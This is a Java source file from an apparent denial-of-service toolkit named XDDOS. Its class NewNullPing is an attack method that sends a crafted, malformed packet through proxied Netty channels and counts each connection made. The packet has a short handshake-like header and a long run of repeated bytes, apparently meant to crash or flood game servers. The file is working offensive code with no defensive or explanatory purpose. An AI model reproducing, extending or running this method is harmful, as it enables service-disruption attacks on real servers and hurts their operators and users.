package XD.XDDOS.methods.impl;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;




public class NewNullPing
  implements IMethod
{
  final int a = Integer.parseInt(System.getProperty("len", "25555"));
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      bbbb.write(15);
      bbbb.write(0);
      bbbb.write(47);
      bbbb.write(911);
      bbbb.write(99);
      bbbb.write(200);
      bbbb.write(10);
      for (int i = 0; i < 1900; i++) {
        bbbb.write(1);
        bbbb.write(0);
      } 
    } catch (IOException e) {
      e.printStackTrace();
    } 
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}

